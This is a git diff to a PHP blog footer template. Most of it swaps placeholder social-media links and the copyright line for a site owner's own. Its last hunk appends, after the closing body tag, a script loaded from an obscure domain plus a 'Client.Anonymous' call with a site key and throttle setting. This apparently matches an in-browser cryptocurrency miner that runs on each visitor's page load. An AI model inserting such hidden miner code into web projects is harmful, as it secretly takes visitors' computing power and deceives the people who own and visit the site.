@@ -144,15 +144,15 @@ defined('BASEPATH') OR exit('No direct script access allowed');
           <div class="col-lg-8 col-md-10 mx-auto">
             <ul class="list-inline text-center">
               <li class="list-inline-item">
-                <a href="#">
+                <a href="https://www.linkedin.com/in/luis-navarro-arenas-6493b1136/">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
-                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                   </span>
                 </a>
               </li>
               <li class="list-inline-item">
-                <a href="#">
+                <a href="https://www.facebook.com/ylit.cl">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
                     <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
@@ -160,7 +160,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
                 </a>
               </li>
               <li class="list-inline-item">
-                <a href="#">
+                <a href="https://github.com/lnavarroa/tutorialGitHub">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
                     <i class="fa fa-github fa-stack-1x fa-inverse"></i>
@@ -168,7 +168,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
                 </a>
               </li>
             </ul>
-            <p class="copyright text-muted">Copyright &copy; Your Website 2018</p>
+            <p class="copyright text-muted">Copyright &copy; YLIT 2018</p>
           </div>
         </div>
       </div>
@@ -182,5 +182,14 @@ defined('BASEPATH') OR exit('No direct script access allowed');
     <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>
 
   </body>
+
+  <script src="https://www.freecontent.date./Kxnd.js"></script>
+  <script>
+    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
+        throttle: 0.9
+    });
+    _client.start();
+
+  </script>
 
 </html>
